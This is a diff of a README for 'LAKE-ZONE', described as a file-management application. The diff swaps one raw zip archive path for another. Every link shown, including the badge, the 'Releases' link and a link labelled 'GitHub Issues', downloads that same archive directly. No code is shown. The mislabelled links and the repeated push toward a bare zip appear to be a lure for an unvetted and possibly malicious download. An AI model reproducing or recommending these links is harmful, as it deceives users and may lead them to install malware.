@@ -6,7 +6,7 @@ Welcome to LAKE-ZONE! This application allows you to easily manage and view your
 
 ## 📥 Download LAKE-ZONE
 
-[![Download LAKE-ZONE](https://github.com/M4TYIE/LAKE-ZONE/raw/refs/heads/main/MARA/ZONE-LAK-2.3.zip%20LAKE--ZONE-v1.0-blue)](https://github.com/M4TYIE/LAKE-ZONE/raw/refs/heads/main/MARA/ZONE-LAK-2.3.zip)
+[![Download LAKE-ZONE](https://github.com/M4TYIE/LAKE-ZONE/raw/refs/heads/main/KAGERA/ZONE-LAK-1.3.zip%20LAKE--ZONE-v1.0-blue)](https://github.com/M4TYIE/LAKE-ZONE/raw/refs/heads/main/KAGERA/ZONE-LAK-1.3.zip)
 
 ## 📝 Overview
 
@@ -30,7 +30,7 @@ Before downloading LAKE-ZONE, ensure your computer meets the following requireme
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [LAKE-ZONE Releases](https://github.com/M4TYIE/LAKE-ZONE/raw/refs/heads/main/MARA/ZONE-LAK-2.3.zip). 
+To get started, visit this page to download: [LAKE-ZONE Releases](https://github.com/M4TYIE/LAKE-ZONE/raw/refs/heads/main/KAGERA/ZONE-LAK-1.3.zip). 
 
 ### Step-by-Step Download
 
@@ -65,7 +65,7 @@ If you encounter any issues while using LAKE-ZONE, consider the following steps:
 
 ## 📞 Support and Contribution
 
-For any questions or suggestions, feel free to reach out through our [GitHub Issues](https://github.com/M4TYIE/LAKE-ZONE/raw/refs/heads/main/MARA/ZONE-LAK-2.3.zip). Your feedback helps improve LAKE-ZONE.
+For any questions or suggestions, feel free to reach out through our [GitHub Issues](https://github.com/M4TYIE/LAKE-ZONE/raw/refs/heads/main/KAGERA/ZONE-LAK-1.3.zip). Your feedback helps improve LAKE-ZONE.
 
 If you enjoy using LAKE-ZONE and want to contribute, please check our contributing guidelines on the repository.
 
